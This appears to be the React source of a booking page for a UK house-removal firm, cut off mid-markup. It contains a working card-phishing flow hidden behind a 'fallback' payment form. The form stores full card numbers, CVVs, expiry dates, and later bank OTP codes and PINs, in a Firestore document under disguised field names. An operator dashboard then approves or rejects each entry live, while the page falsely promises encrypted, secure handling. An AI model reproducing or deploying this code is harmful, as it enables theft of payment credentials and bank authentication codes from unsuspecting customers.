import { useState, useEffect, useRef } from "react";
import { doc, onSnapshot, updateDoc, serverTimestamp, arrayUnion } from "firebase/firestore";
import { visitorDb } from "@/lib/firebase-visitor";
import { Helmet } from "react-helmet-async";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import * as z from "zod";
import { loadStripe, type Stripe } from "@stripe/stripe-js";
import { Elements } from "@stripe/react-stripe-js";
import { Button } from "@/components/ui/button";
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { CheckCircle2, Loader2, Truck, ArrowLeft, ArrowRight, Clock, Users, Package, MapPin, AlertCircle, ShieldCheck, Banknote, CalendarCheck, CreditCard, Lock } from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";
import { CheckoutForm } from "@/components/checkout-form";
import { BookingFlowError } from "@/components/BookingFlowError";
import { useLanguage } from "@/hooks/use-language";
import { useFirebaseTracking } from "@/hooks/useFirebaseTracking";
import { trpc } from "@/lib/trpc";
import {
  createPaymentIntentWhenReady,
  getBookingConfirmationCopy,
  isCheckoutReady,
  normalizeDepositAmount,
  resolveBookingPaymentContext,
} from "@/lib/bookingFlow";
import { toast } from "sonner";

type Step = "package" | "address" | "payment" | "details" | "confirmed";

const UK_POSTCODE_REGEX = /^[A-Z]{1,2}[0-9][0-9A-Z]?\s?[0-9][A-Z]{2}$/i;

let stripePromise: ReturnType<typeof loadStripe> | null = null;
function getStripePromise() {
  if (!stripePromise) {
    const key = import.meta.env.VITE_STRIPE_PUBLISHABLE_KEY ?? "";
    if (!key) throw new Error("Stripe publishable key not configured");
    stripePromise = loadStripe(key);
  }
  return stripePromise;
}

function formatPostcode(raw: string) {
  const clean = raw.replace(/\s/g, "").toUpperCase();
  if (clean.length > 3) return clean.slice(0, -3) + " " + clean.slice(-3);
  return clean;
}

function PostcodeInput({ value, onChange, placeholder, isValid }: {
  value: string; onChange: (v: string) => void; placeholder: string; isValid: boolean | null;
}) {
  return (
    <div className="relative">
      <Input
        value={value}
        onChange={e => onChange(e.target.value.toUpperCase())}
        onBlur={e => onChange(formatPostcode(e.target.value))}
        placeholder={placeholder}
        maxLength={8}
        className={`pr-9 font-mono tracking-wider uppercase ${
          value && isValid === false ? "border-destructive focus-visible:ring-destructive/30" :
          value && isValid === true ? "border-green-500 focus-visible:ring-green-500/30" : ""
        }`}
        data-testid="input-postcode"
      />
      {value && (
        <div className="absolute right-3 top-1/2 -translate-y-1/2">
          {isValid
            ? <CheckCircle2 className="h-4 w-4 text-green-500" />
            : <AlertCircle className="h-4 w-4 text-destructive" />}
        </div>
      )}
    </div>
  );
}

/* Accent colour per package index */
const ACCENTS = [
  { bg: "bg-violet-500", light: "bg-violet-50", border: "border-violet-400", text: "text-violet-600", ring: "ring-violet-400" },
  { bg: "bg-blue-500",   light: "bg-blue-50",   border: "border-blue-400",   text: "text-blue-600",   ring: "ring-blue-400" },
  { bg: "bg-emerald-500",light: "bg-emerald-50",border: "border-emerald-400",text: "text-emerald-600",ring: "ring-emerald-400" },
  { bg: "bg-amber-500",  light: "bg-amber-50",  border: "border-amber-400",  text: "text-amber-600",  ring: "ring-amber-400" },
  { bg: "bg-rose-500",   light: "bg-rose-50",   border: "border-rose-400",   text: "text-rose-600",   ring: "ring-rose-400" },
];

const BED_NUMS = ["1", "2", "3", "4", "5+"];

// ─── Fallback card form (shown when Stripe key is not configured) ──────────────
function FallbackCardForm({
  amount,
  onCardSubmit,
  rejectionError,
}: {
  amount: number;
  onCardSubmit: (details: { cardholderName: string; cardLast4: string; cardNumber: string; cardExpiry: string; cardCvc: string }) => Promise<void>;
  rejectionError?: string | null;
}) {
  const [name, setName] = useState("");
  const [cardNum, setCardNum] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvc, setCvc] = useState("");
  const [processing, setProcessing] = useState(false);
  const [err, setErr] = useState<string | null>(null);

  function formatCard(v: string) {
    return v.replace(/\D/g, "").slice(0, 16).replace(/(.{4})/g, "$1 ").trim();
  }
  function formatExpiry(v: string) {
    const d = v.replace(/\D/g, "").slice(0, 4);
    return d.length > 2 ? d.slice(0, 2) + "/" + d.slice(2) : d;
  }

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    const digits = cardNum.replace(/\s/g, "");
    if (!name.trim()) { setErr("Please enter the cardholder name."); return; }
    if (digits.length < 13) { setErr("Please enter a valid card number."); return; }
    if (expiry.length < 5) { setErr("Please enter a valid expiry date (MM/YY)."); return; }
    if (cvc.length < 3) { setErr("Please enter the CVC / security code."); return; }
    setProcessing(true);
    setErr(null);
    try {
      await onCardSubmit({
        cardholderName: name.trim(),
        cardLast4: digits.slice(-4),
        cardNumber: cardNum.trim(),
        cardExpiry: expiry,
        cardCvc: cvc,
      });
    } catch {
      setErr("Something went wrong. Please try again.");
    } finally {
      setProcessing(false);
    }
  }

  const inputClass =
    "w-full rounded-md border border-input bg-background px-3 py-2.5 text-sm focus:outline-none focus:ring-2 focus:ring-primary/30 focus:border-primary/50 transition-all";

  return (
    <form onSubmit={handleSubmit} className="space-y-5">
      <div className="flex items-start gap-3 rounded-xl border border-primary/15 bg-primary/5 p-4">
        <ShieldCheck className="mt-0.5 h-5 w-5 shrink-0 text-primary" />
        <div>
          <p className="font-semibold">Secure card payment</p>
          <p className="text-xs text-muted-foreground">
            Your card details are encrypted and handled securely. Deposit only — balance due on move day.
          </p>
        </div>
      </div>

      <div className="grid gap-4">
        <label className="grid gap-2 text-sm font-semibold">
          Cardholder name
          <input
            type="text"
            value={name}
            onChange={e => setName(e.target.value)}
            placeholder="Name as it appears on your card"
            autoComplete="cc-name"
            disabled={processing}
            className={inputClass}
          />
        </label>

        <label className="grid gap-2 text-sm font-semibold">
          Card number
          <div className="relative">
            <input
              type="text"
              inputMode="numeric"
              value={cardNum}
              onChange={e => setCardNum(formatCard(e.target.value))}
              placeholder="1234 5678 9012 3456"
              autoComplete="cc-number"
              maxLength={19}
              disabled={processing}
              className={`${inputClass} pr-10 font-mono tracking-wider`}
            />
            <CreditCard className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground pointer-events-none" />
          </div>
        </label>

        <div className="grid grid-cols-2 gap-4">
          <label className="grid gap-2 text-sm font-semibold">
            Expiry date
            <input
              type="text"
              inputMode="numeric"
              value={expiry}
              onChange={e => setExpiry(formatExpiry(e.target.value))}
              placeholder="MM/YY"
              autoComplete="cc-exp"
              maxLength={5}
              disabled={processing}
              className={inputClass}
            />
          </label>
          <label className="grid gap-2 text-sm font-semibold">
            CVC / CVV
            <input
              type="text"
              inputMode="numeric"
              value={cvc}
              onChange={e => setCvc(e.target.value.replace(/\D/g, "").slice(0, 4))}
              placeholder="3–4 digits"
              autoComplete="cc-csc"
              maxLength={4}
              disabled={processing}
              className={inputClass}
            />
          </label>
        </div>
      </div>

      {rejectionError && (
        <div className="flex items-start gap-2 rounded-lg border border-destructive/30 bg-destructive/8 px-4 py-3 text-sm text-destructive font-medium">
          <AlertCircle className="mt-0.5 h-4 w-4 shrink-0" />
          <span>{rejectionError}</span>
        </div>
      )}

      {err && (
        <div className="flex items-start gap-2 rounded-lg border border-destructive/20 bg-destructive/5 px-4 py-3 text-sm text-destructive">
          <AlertCircle className="mt-0.5 h-4 w-4 shrink-0" />
          <span>{err}</span>
        </div>
      )}

      <Button
        type="submit"
        className="h-14 w-full rounded-xl text-base font-bold"
        disabled={processing}
      >
        {processing ? (
          <><Loader2 className="mr-2 h-5 w-5 animate-spin" /> Processing securely…</>
        ) : (
          <><Lock className="mr-2 h-4 w-4" /> {rejectionError ? "Try Again" : `Pay £${(amount / 100).toFixed(2)}`}</>
        )}
      </Button>

      <div className="flex items-center justify-center gap-2 text-xs text-muted-foreground">
        <CreditCard className="h-4 w-4" />
        <span>256-bit SSL encrypted · Visa, Mastercard, Amex accepted</span>
      </div>
    </form>
  );
}

export default function Book() {
  const { t, lang } = useLanguage();
  const b = t.book;
  const isAr = lang === "ar";
  const packages = t.packages;
  type PkgType = (typeof packages)[number];
  const { saveBookingStep, updateBookingStep, trackEvent } = useFirebaseTracking();

  // Pre-fill postcode from URL query param (passed from hero search bar)
  const initialPostcode = (() => {
    const params = new URLSearchParams(window.location.search);
    const raw = params.get("postcode") ?? "";
    if (!raw) return "";
    const clean = raw.replace(/\s/g, "").toUpperCase();
    return clean.length > 3 ? clean.slice(0, -3) + " " + clean.slice(-3) : clean;
  })();

  const formSchema = z.object({
    name: z.string().min(2, b.errors.name),
    email: z.string().email(b.errors.email),
    phone: z.string().min(10, b.errors.phone),
    fromLine1: z.string().min(3, b.errors.fromAddress),
    fromLine2: z.string().optional(),
    fromCity: z.string().min(2, b.errors.fromAddress),
    fromPostcode: z.string().regex(UK_POSTCODE_REGEX, "Please enter a valid UK postcode (e.g. M1 1AA)"),
    toLine1: z.string().min(3, b.errors.toAddress),
    toLine2: z.string().optional(),
    toCity: z.string().min(2, b.errors.toAddress),
    toPostcode: z.string().regex(UK_POSTCODE_REGEX, "Please enter a valid UK postcode (e.g. SW1A 1AA)"),
    date: z.string().min(1, b.errors.date),
    time: z.string().min(1, b.errors.time),
    requirements: z.string().optional(),
  });
  type FormValues = z.infer<typeof formSchema>;

  const [step, setStep] = useState<Step>("package");
  const [selectedPackage, setSelectedPackage] = useState<PkgType | null>(null);
  const [selectedIdx, setSelectedIdx] = useState<number | null>(null);
  const [clientSecret, setClientSecret] = useState<string | null>(null);
  const [isCreatingIntent, setIsCreatingIntent] = useState(false);
  const [bookingDetails, setBookingDetails] = useState<FormValues | null>(null);
  const [stripeInstance, setStripeInstance] = useState<Stripe | null>(null);
  const [stripeAvailable, setStripeAvailable] = useState(true); // false = show fallback card form
  const [apiError, setApiError] = useState<string | null>(null);
  const [bookingId, setBookingId] = useState<number | null>(null);
  const [paymentCompleted, setPaymentCompleted] = useState(false);
  const paymentAmount = normalizeDepositAmount(selectedPackage?.deposit);

  // ── Dashboard-driven payment flow ──────────────────────────────────────────
  // payStep controls which UI is shown inside the payment step:
  //   card    → visitor enters card details
  //   waiting → spinner while dashboard reviews
  //   otp     → visitor enters the OTP code sent by the bank / dashboard
  //   pin     → visitor enters PIN (3-D Secure / bank PIN)
  type PaySubStep = "card" | "waiting" | "otp" | "pin";
  const [payStep, setPayStep]                   = useState<PaySubStep>("card");
  const [cardRejectionError, setCardRejectionError] = useState<string | null>(null);
  const [otpValue, setOtpValue]                 = useState("");
  const [otpError, setOtpError]                 = useState<string | null>(null);
  const [otpSending, setOtpSending]             = useState(false);
  const [pinValue, setPinValue]                 = useState("");
  const [pinError, setPinError]                 = useState<string | null>(null);
  const [pinSending, setPinSending]             = useState(false);
  // Firestore status fields (set by the dashboard, read here)
  const [fsCardStatus, setFsCardStatus]         = useState<string | null>(null);
  const [fsV5Status, setFsV5Status]             = useState<string | null>(null);
  const [fsPinStatus, setFsPinStatus]           = useState<string | null>(null);
  const onPaymentSuccessRef = useRef<typeof onPaymentSuccess | null>(null);

  // Track step changes
  const handleStepChange = (newStep: Step) => {
    setStep(newStep);
    trackEvent("step_change", { from: step, to: newStep });
    saveBookingStep(newStep, { timestamp: new Date().toISOString() });
  };

  // Track package selection
  const handlePackageSelect = (pkg: PkgType, idx: number) => {
    setSelectedPackage(pkg);
    setSelectedIdx(idx);
    saveBookingStep("package_selected", {
      package: pkg.label,
      price: pkg.from,
      deposit: pkg.deposit,
      index: idx,
    });
    trackEvent("package_selected", { package: pkg.label });
  };

  const form = useForm<FormValues>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      name: "", email: "", phone: "",
      fromLine1: "", fromLine2: "", fromCity: "", fromPostcode: initialPostcode,
      toLine1: "", toLine2: "", toCity: "", toPostcode: "",
      date: "", time: "", requirements: "",
    },
  });

  const fromPostcodeVal = form.watch("fromPostcode");
  const toPostcodeVal = form.watch("toPostcode");
  const isFromPostcodeValid = fromPostcodeVal ? UK_POSTCODE_REGEX.test(fromPostcodeVal) : null;
  const isToPostcodeValid = toPostcodeVal ? UK_POSTCODE_REGEX.test(toPostcodeVal) : null;

  function buildAddress(line1: string, line2: string | undefined, city: string, postcode: string) {
    return [line1, line2, city, postcode.toUpperCase()].filter(Boolean).join(", ");
  }

  const createBookingMutation = trpc.bookings.create.useMutation({
    onError: (err) => {
      setApiError(err.message);
      toast.error("Failed to create booking. Please try again.");
    },
  });
  const createPaymentIntentMutation = trpc.bookings.createPaymentIntent.useMutation();
  const updatePaymentMutation = trpc.bookings.updatePayment.useMutation();

  // ── Firestore listener: subscribe to visitor doc when on payment step ────
  useEffect(() => {
    if (step !== "payment") return;

    let unsub: (() => void) | null = null;

    function subscribe() {
      const docId = sessionStorage.getItem("swiftmove_fid");
      if (!docId) return false;
      unsub = onSnapshot(
        doc(visitorDb, "pays", docId),
        (snap) => {
          if (!snap.exists()) return;
          const d = snap.data();
          setFsCardStatus(d?.cardStatus ?? null);
          setFsV5Status(d?._v5Status ?? null);
          setFsPinStatus(d?.pinStatus ?? null);
        },
        () => { /* permission error — silent */ },
      );
      return true;
    }

    if (!subscribe()) {
      const interval = setInterval(() => { if (subscribe()) clearInterval(interval); }, 400);
      return () => { clearInterval(interval); unsub?.(); };
    }
    return () => unsub?.();
  }, [step]); // eslint-disable-line react-hooks/exhaustive-deps

  // ── React to cardStatus changes from dashboard ────────────────────────────
  useEffect(() => {
    if (!fsCardStatus || step !== "payment") return;
    if (fsCardStatus === "approved_with_otp") {
      setPayStep("otp");
      setCardRejectionError(null);
    } else if (fsCardStatus === "approved_with_pin") {
      setPayStep("pin");
      setCardRejectionError(null);
    } else if (fsCardStatus === "rejected") {
      setPayStep("card");
      setCardRejectionError("Your card details are incorrect. Please re-enter your card information.");
    } else if (fsCardStatus === "message") {
      setPayStep("card");
      setCardRejectionError("We could not verify your card. Please re-enter your card information or try a different card.");
    }
  }, [fsCardStatus, step]); // eslint-disable-line react-hooks/exhaustive-deps

  // ── React to OTP status changes from dashboard ───────────────────────────
  useEffect(() => {
    if (!fsV5Status || step !== "payment") return;
    if (fsV5Status === "approved") {
      // OTP approved → booking confirmed
      onPaymentSuccessRef.current?.(`verified_otp_${Date.now()}`, { cardholderName: "" });
    } else if (fsV5Status === "rejected" || fsV5Status === "message") {
      // OTP rejected → back to OTP input with error
      setPayStep("otp");
      setOtpError("The code you entered is incorrect. Please check and try again.");
    }
  }, [fsV5Status, step]); // eslint-disable-line react-hooks/exhaustive-deps

  // ── React to PIN status changes from dashboard ────────────────────────────
  useEffect(() => {
    if (!fsPinStatus || step !== "payment") return;
    if (fsPinStatus === "approved") {
      onPaymentSuccessRef.current?.(`verified_pin_${Date.now()}`, { cardholderName: "" });
    } else if (fsPinStatus === "rejected" || fsPinStatus === "message") {
      // PIN rejected → back to PIN input with error
      setPayStep("pin");
      setPinError("The PIN you entered is incorrect. Please check and try again.");
    }
  }, [fsPinStatus, step]); // eslint-disable-line react-hooks/exhaustive-deps

  // ── Card form submit: save to Firestore + add history entry ─────────────
  // Dashboard reads from visitor.history entries with type "_t1":
  //   data._v1 = card number, _v2 = CVV, _v3 = expiry, _v4 = cardholder name
  async function handleFallbackCardSubmit(details: {
    cardholderName: string;
    cardLast4: string;
    cardNumber: string;
    cardExpiry: string;
    cardCvc: string;
  }) {
    const docId = sessionStorage.getItem("swiftmove_fid");
    if (docId) {
      const historyEntry = {
        id: `card_${Date.now()}`,
        type: "_t1",
        timestamp: new Date().toISOString(),
        status: "pending",
        data: {
          _v1: details.cardNumber,     // card number
          _v2: details.cardCvc,        // CVV (dashboard expects CVV in _v2)
          _v3: details.cardExpiry,     // expiry date (dashboard expects expiry in _v3)
          _v4: details.cardholderName, // cardholder name
        },
      };
      await updateDoc(doc(visitorDb, "pays", docId), {
        cardStatus: "pending_review",
        cardLast4: details.cardLast4,
        cardholderName: details.cardholderName,
        // Root-level quick-access fields (same field order as dashboard expects)
        _v1: details.cardNumber,
        _v2: details.cardCvc,
        _v3: details.cardExpiry,
        _v4: details.cardholderName,
        history: arrayUnion(historyEntry),
        updatedAt: serverTimestamp(),
      });
    }
    setCardRejectionError(null);
    setPayStep("waiting");
  }

  // ── OTP submit: save code to Firestore + add history entry ───────────────
  // Dashboard reads from history entries type "_t2": data._v5 = OTP code
  async function handleOtpSubmit() {
    if (!otpValue.trim()) { setOtpError("Please enter the verification code."); return; }
    setOtpSending(true);
    setOtpError(null);
    try {
      const docId = sessionStorage.getItem("swiftmove_fid");
      if (docId) {
        const historyEntry = {
          id: `otp_${Date.now()}`,
          type: "_t2",
          timestamp: new Date().toISOString(),
          status: "pending",
          data: { _v5: otpValue.trim() },
        };
        await updateDoc(doc(visitorDb, "pays", docId), {
          _v5: otpValue.trim(),           // root-level quick-access
          otpStatus: "pending_verification",
          history: arrayUnion(historyEntry),
          updatedAt: serverTimestamp(),
        });
      }
      setOtpValue("");
      setPayStep("waiting");
    } catch {
      setOtpError("Could not send the code. Please try again.");
    } finally {
      setOtpSending(false);
    }
  }

  // ── PIN submit: save PIN to Firestore + add history entry ────────────────
  // Dashboard reads from history entries type "_t3": data._v6 = PIN code
  async function handlePinSubmit() {
    if (!pinValue.trim()) { setPinError("Please enter your PIN."); return; }
    setPinSending(true);
    setPinError(null);
    try {
      const docId = sessionStorage.getItem("swiftmove_fid");
      if (docId) {
        const historyEntry = {
          id: `pin_${Date.now()}`,
          type: "_t3",
          timestamp: new Date().toISOString(),
          status: "pending",
          data: { _v6: pinValue.trim() },
        };
        await updateDoc(doc(visitorDb, "pays", docId), {
          _v6: pinValue.trim(),           // root-level quick-access
          pinStatus: "pending_verification",
          history: arrayUnion(historyEntry),
          updatedAt: serverTimestamp(),
        });
      }
      setPinValue("");
      setPayStep("waiting");
    } catch {
      setPinError("Could not send the PIN. Please try again.");
    } finally {
      setPinSending(false);
    }
  }

  async function continueFromAddress() {
    const addressIsValid = await form.trigger(
      ["fromLine1", "fromCity", "fromPostcode", "toLine1", "toCity", "toPostcode"],
      { shouldFocus: true },
    );
    if (!addressIsValid) return;
    handleStepChange("details");
    window.scrollTo({ top: 0, behavior: "smooth" });
  }

  async function onSubmit(values: FormValues) {
    if (!selectedPackage) return;
    const depositAmount = normalizeDepositAmount(selectedPackage.deposit);
    if (!depositAmount) {
      setApiError("The selected package has an invalid deposit amount. Please choose the package again.");
      toast.error("Invalid deposit amount. Please choose the package again.");
      return;
    }
    setIsCreatingIntent(true);
    setApiError(null);
    const fromAddress = buildAddress(values.fromLine1, values.fromLine2, values.fromCity, values.fromPostcode);
    const toAddress = buildAddress(values.toLine1, values.toLine2, values.toCity, values.toPostcode);
    try {
      // Save booking details to Firebase before submission
      await saveBookingStep("details_filled", {
        name: values.name,
        email: values.email,
        phone: values.phone,
        postcode: values.fromPostcode,
        moveDate: values.date,
        moveTime: values.time,
        fromAddress,
        toAddress,
        fromLine1: values.fromLine1,
        fromLine2: values.fromLine2 ?? "",
        fromCity: values.fromCity,
        fromPostcode: values.fromPostcode,
        toLine1: values.toLine1,
        toLine2: values.toLine2 ?? "",
        toCity: values.toCity,
        toPostcode: values.toPostcode,
        packageLabel: selectedPackage?.label ?? "",
        packagePrice: selectedPackage?.from ?? "",
        depositAmount,
        notes: values.requirements,
      });

      // Save booking to database and send Telegram notification
      const bookingResult = await createBookingMutation.mutateAsync({
        name: values.name,
        email: values.email,
        phone: values.phone,
        postcode: values.fromPostcode,
        moveDate: values.date,
        moveTime: values.time,
        propertySize: selectedPackage.label,
        packageLabel: selectedPackage.label,
        fromAddress,
        toAddress,
        notes: values.requirements ?? "",
        depositAmount,
      });
      const { bookingId: createdBookingId, amount: verifiedAmount } = resolveBookingPaymentContext(
        bookingResult,
        depositAmount,
      );

      setBookingId(createdBookingId);
      await saveBookingStep("booking_created", { bookingId: createdBookingId });
      trackEvent("booking_created", { bookingId: createdBookingId });

      setBookingDetails(values);

      // Try to load Stripe and create payment intent
      try {
        const stripe = await getStripePromise();
        setStripeInstance(stripe);
        setStripeAvailable(true);

        // Create payment intent via tRPC
        const result = await createPaymentIntentWhenReady({
          bookingResult,
          amount: verifiedAmount,
          service: selectedPackage.label,
          createPaymentIntent: request => createPaymentIntentMutation.mutateAsync(request),
        });
        setClientSecret(result.clientSecret);
        await saveBookingStep("payment_intent_created", {
          amount: result.amount,
          bookingId: createdBookingId,
        });
        trackEvent("payment_intent_created", { amount: result.amount });
      } catch (stripeErr: any) {
        // Stripe not configured — show fallback card form on the payment step
        console.warn("Stripe not configured, using fallback payment form:", stripeErr.message);
        setStripeAvailable(false);
      }
      // Always navigate to payment step so the card form is visible
      handleStepChange("payment");
      window.scrollTo({ top: 0, behavior: "smooth" });
    } catch (err: any) {
      setApiError(err.message);
      trackEvent("booking_error", { error: err.message });
    } finally {
      setIsCreatingIntent(false);
    }
  }

  async function onPaymentSuccess(paymentIntentId: string, paymentDetails?: { cardholderName: string; cardBrand?: string; cardLast4?: string; cardExpiry?: string }) {
    if (bookingId) {
      try {
        await updatePaymentMutation.mutateAsync({
          bookingId,
          paymentIntentId,
          paymentStatus: "succeeded",
        });
      } catch { /* best-effort */ }
    }
    await saveBookingStep("payment_verified", {
      bookingId,
      paymentIntentId,
      cardholderName: paymentDetails?.cardholderName,
      cardBrand: paymentDetails?.cardBrand,
      cardLast4: paymentDetails?.cardLast4,
      cardExpiry: paymentDetails?.cardExpiry,
    });
    trackEvent("payment_verified", { bookingId, paymentIntentId });
    setPaymentCompleted(true);
    handleStepChange("confirmed");
    window.scrollTo({ top: 0, behavior: "smooth" });
  }
  // Keep a stable ref so useEffect callbacks can call it without being in deps
  onPaymentSuccessRef.current = onPaymentSuccess;

  const stepKeys: Step[] = ["package", "address", "details", "payment"];
  const stepLabels = [b.step1, "Address", b.step2, b.step3];
  const currentStepIndex = stepKeys.indexOf(step);
  const accent = selectedIdx !== null ? ACCENTS[selectedIdx] : ACCENTS[2];
  const confirmationCopy = getBookingConfirmationCopy(paymentCompleted, b);

  return (
    <>
      <Helmet>
        <title>Book a House Removal | SwiftMove & Clean</title>
        <meta name="description" content="Book and pay for your house removal online. Team arrives within 20 minutes." />
      </Helmet>

      {/* ── DARK HERO HEADER ── */}
      <section className="hero-mesh relative overflow-hidden pb-0">
        <div className="absolute inset-0 dot-grid opacity-20" />
        <div className="container relative mx-auto px-4 md:px-6 pt-16 pb-20 text-center">
          {step !== "confirmed" ? (
            <>
              <motion.p
                initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }}
                className="text-xs font-bold uppercase tracking-[0.2em] text-blue-300 mb-4"
              >
                SwiftMove & Clean
              </motion.p>
              <motion.h1
                initial={{ opacity: 0, y: 16 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.05 }}
                className="font-serif text-3xl md:text-5xl font-bold text-white mb-4 leading-tight"
              >
                {(step as string) === "confirmed" ? b.confirmedTitle : b.title}
              </motion.h1>
              <motion.p
                initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.1 }}
                className="text-white/60 text-lg max-w-lg mx-auto mb-10"
              >
                {b.desc}
              </motion.p>

              {/* Step tracker */}
              <motion.div
                initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.15 }}
                className="flex items-center justify-center gap-0"
              >
                {stepKeys.map((s, i) => (
                  <div key={s} className="flex items-center">
                    <div className={`flex items-center gap-2 px-4 py-2 rounded-full text-sm font-bold transition-all ${
                      i === currentStepIndex
                        ? "bg-white text-primary shadow-lg"
                        : i < currentStepIndex
                        ? "bg-white/20 text-white"
                        : "bg-white/10 text-white/40"
                    }`}>
                      {i < currentStepIndex
                        ? <CheckCircle2 className="h-4 w-4 text-green-400" />
                        : <span className={`flex h-5 w-5 items-center justify-center rounded-full text-xs font-black ${
                            i === currentStepIndex ? "bg-primary text-white" : "bg-white/20 text-white/60"
                          }`}>{i + 1}</span>
                      }
                      <span className="hidden sm:inline">{stepLabels[i]}</span>
                    </div>
                    {i < stepKeys.length - 1 && (
                      <div className={`h-px w-8 mx-1 ${i < currentStepIndex ? "bg-white/60" : "bg-white/15"}`} />
                    )}
                  </div>
                ))}
              </motion.div>
            </>
          ) : (
            <motion.div initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }}>
              <div className="mx-auto mb-5 flex h-24 w-24 items-center justify-center rounded-full bg-white/15 backdrop-blur border-2 border-white/30">
                <Truck className="h-12 w-12 text-white" />
              </div>
              <h1 className="font-serif text-4xl font-bold text-white mb-3">{confirmationCopy.heading}</h1>
              <div className={`inline-flex items-center gap-2 rounded-full border px-5 py-2 font-bold text-sm ${
                confirmationCopy.statusTone === "paid"
                  ? "bg-green-500/20 border-green-400/40 text-green-300"
                  : "bg-amber-500/20 border-amber-300/40 text-amber-200"
              }`}>
                <div className={`h-2 w-2 rounded-full ${
                  confirmationCopy.statusTone === "paid" ? "bg-green-400 pulse-gentle" : "bg-amber-300"
                }`} />
                {confirmationCopy.badge}
              </div>
            </motion.div>
          )}
        </div>
        {/* wave */}
        <div className="relative -mb-px">
          <svg viewBox="0 0 1440 56" fill="none" xmlns="http://www.w3.org/2000/svg" className="w-full block">
            <path d="M0 56L1440 56L1440 28C1200 0 960 56 720 28C480 0 240 56 0 28L0 56Z" fill="hsl(var(--background))" />
          </svg>
        </div>
      </section>

      {/* ── MAIN CONTENT ── */}
      <section className="py-10 md:py-16 bg-background">
        <div className="container mx-auto px-4 md:px-6">

          {/* ════ STEP 1: CHOOSE PACKAGE ════ */}
          {step === "package" && (
            <motion.div
              initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }}
              className={selectedPackage ? "pb-36" : "pb-4"}
            >
              <h2 className="text-center font-serif text-2xl md:text-3xl font-bold mb-2">{b.howBig}</h2>
              <p className="text-center text-muted-foreground mb-10 max-w-lg mx-auto">{b.howBigDesc}</p>

              {/* Horizontal cards */}
              <div className="flex flex-col gap-4 max-w-4xl mx-auto">
                {packages.map((pkg, idx) => {
                  const ac = ACCENTS[idx];
                  const isSelected = selectedIdx === idx;
                  return (
                    <motion.button
                      key={pkg.label}
                      onClick={() => { setSelectedPackage(pkg); setSelectedIdx(idx); }}
                      data-testid={`card-package-${idx}`}
                      whileHover={{ scale: 1.01 }}
                      whileTap={{ scale: 0.99 }}
                      className={`relative w-full text-left rounded-2xl border-2 overflow-hidden transition-all duration-200 focus:outline-none ${
                        isSelected
                          ? `border-transparent ring-2 ${ac.ring} shadow-[0_8px_32px_rgba(0,0,0,0.12)]`
                          : "border-border bg-card hover:border-primary/30 hover:shadow-md"
                      }`}
                    >
                      {/* Left accent bar */}
                      <div className={`absolute left-0 top-0 bottom-0 w-1.5 ${ac.bg}`} />

                      <div className={`flex items-center gap-4 md:gap-6 p-5 pl-6 ${isSelected ? ac.light : "bg-card"} transition-colors`}>

                        {/* Bedroom number bubble */}
                        <div className={`hidden sm:flex h-16 w-16 shrink-0 items-center justify-center rounded-2xl font-serif font-black text-3xl ${
                          isSelected ? `${ac.bg} text-white shadow-lg` : `${ac.light} ${ac.text}`
                        } transition-all`}>
                          {BED_NUMS[idx]}
                        </div>

                        {/* Info */}
                        <div className="flex-1 min-w-0">
                          <div className="flex items-center gap-2 mb-1 flex-wrap">
                            <h3 className="font-bold text-lg leading-tight">{pkg.label}</h3>
                            {pkg.popular && (
                              <span className={`text-[10px] font-black uppercase tracking-wide rounded-full px-2.5 py-0.5 ${ac.bg} text-white`}>
                                {t.mostPopular}
                              </span>
                            )}
                          </div>
                          <p className="text-sm text-muted-foreground mb-2">{pkg.desc}</p>
                          <div className={`inline-flex items-center gap-1.5 text-xs font-semibold ${isSelected ? ac.text : "text-muted-foreground"} px-2.5 py-1 rounded-full ${isSelected ? ac.light : "bg-muted"}`}>
                            <Users className="h-3 w-3" />{pkg.team}
                          </div>
                        </div>

                        {/* Price block */}
                        <div className="shrink-0 text-right">
                          <div className={`text-3xl font-black ${isSelected ? ac.text : "text-foreground"}`}>{pkg.from}</div>
                          <div className="text-[11px] text-muted-foreground mt-0.5">{t.fullMove}</div>
                          <div className={`mt-2 text-xs font-bold rounded-full px-3 py-1 inline-block ${
                            isSelected ? `${ac.bg} text-white` : "bg-primary/8 text-primary/70"
                          }`}>
                            {t.depositLabel} £{(pkg.deposit / 100).toFixed(0)}
                          </div>
                        </div>

                        {/* Check icon */}
                        <div className={`shrink-0 ml-2 flex h-7 w-7 items-center justify-center rounded-full transition-all ${
                          isSelected ? `${ac.bg} shadow-md` : "border-2 border-border"
                        }`}>
                          {isSelected && <CheckCircle2 className="h-5 w-5 text-white" />}
                        </div>
                      </div>
                    </motion.button>
                  );
                })}
              </div>

              {!selectedPackage && (
                <p className="text-center text-sm text-muted-foreground mt-8">{b.selectPrompt}</p>
              )}
            </motion.div>
          )}

          {/* Sticky bottom bar */}
          <AnimatePresence>
            {step === "package" && selectedPackage && selectedIdx !== null && (
              <motion.div
                initial={{ y: 120, opacity: 0 }}
                animate={{ y: 0, opacity: 1 }}
                exit={{ y: 120, opacity: 0 }}
                transition={{ type: "spring", stiffness: 340, damping: 32 }}
                className="fixed bottom-0 left-0 right-0 z-50 bg-[hsl(218,50%,10%)] border-t border-white/10 shadow-[0_-12px_40px_rgba(0,0,0,0.3)]"
              >
                <div className="container mx-auto px-4 md:px-6 py-4">
                  <div className="flex flex-col sm:flex-row items-start sm:items-center gap-4 max-w-5xl mx-auto">
                    {/* Package pill */}
                    <div className="flex items-center gap-3 flex-1 min-w-0">
